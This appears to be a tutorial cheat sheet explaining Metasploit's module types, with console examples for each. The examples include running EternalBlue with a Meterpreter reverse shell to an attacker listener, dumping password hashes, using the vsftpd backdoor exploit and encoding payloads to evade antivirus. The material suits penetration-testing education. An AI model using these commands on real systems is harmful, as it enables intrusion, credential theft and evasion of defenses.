# Metasploit Modules 

Metasploit’s power lies in its modular architecture. Each module serves a specific function in the penetration testing lifecycle.

| Module Type        | Description       |
|--------------------|--------------------------------------------------------------|
| **Exploit Modules**    | Used to take advantage of a specific vulnerability.                   |
| **Auxiliary Modules**  | Perform tasks like scanning, fuzzing, or denial-of-service.           |
| **Post Modules**       | Run after exploitation (e.g., gather system info, escalate privileges).|
| **Payloads**           | Code that runs after successful exploitation (e.g., Meterpreter shell).|
| **Encoders**           | Obfuscate payloads to evade detection.                                |
| **NOP Generators**     | Used to pad payloads with no-operation instructions.                  |


---



## 🔹 1. Exploit Modules

**Purpose:** Take advantage of specific vulnerabilities to gain access or execute code on a target system.

**Subcategories:**
- `remote`: Exploits that work over a network.
- `local`: Privilege escalation on a system you already have access to.
- `browser`: Exploits for browser vulnerabilities.
- `fileformat`: Exploits in document or file formats.

**Example:**
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

---

## 🔹 2. Auxiliary Modules

**Purpose:** Perform tasks other than exploitation, such as scanning, fuzzing, or denial of service.

**Subcategories:**
- `scanner`: Port scanners, service detectors, etc.
- `admin`: Perform administrative actions like brute force logins.
- `fuzzer`: Test services with fuzzed data.
- `dos`: Denial-of-service attacks.

**Example:**
```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run
```

---

## 🔹 3. Post Modules

**Purpose:** Post-exploitation tasks such as data collection, privilege escalation, or persistence.

**Subcategories:**
- `gather`: Collect information like hashes, user data, or config files.
- `escalate`: Attempt to gain higher privileges.
- `manage`: Add users, delete files, schedule tasks.

**Example:**
```bash
use post/windows/gather/hashdump
set SESSION 1
run
```

---

## 🔹 4. Payloads

**Purpose:** Code that runs on the target after exploitation.

**Types:**
- **Singles:** Self-contained payloads.
- **Stagers:** Small initial payloads that set up a communication channel.
- **Stages:** Larger payloads delivered after a stager succeeds.

**Popular Payloads:**
- `windows/meterpreter/reverse_tcp`
- `linux/x86/meterpreter/reverse_tcp`
- `cmd/unix/reverse`

**Example:**
```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

---

## 🔹 5. Encoders

**Purpose:** Obfuscate payloads to evade antivirus or intrusion detection.

**Popular Encoders:**
- `x86/shikata_ga_nai`
- `cmd/echo`

**Example:**
```bash
set ENCODER x86/shikata_ga_nai
```

---

## 🔹 6. NOP Generators

**Purpose:** Add no-operation instructions to pad shellcode or bypass size restrictions.

**Example:**
```bash
set NOP x86/single_byte
```

---

## 🔹 Listing and Using Modules

### List Modules by Type
```bash
show exploits
show auxiliary
show post
show payloads
show encoders
```

### Search and Use a Module
```bash
search ftp
use exploit/unix/ftp/vsftpd_234_backdoor
```

### View Module Info
```bash
info
```

---

Understanding these modules allows you to fully harness Metasploit for reconnaissance, exploitation, and post-exploitation operations.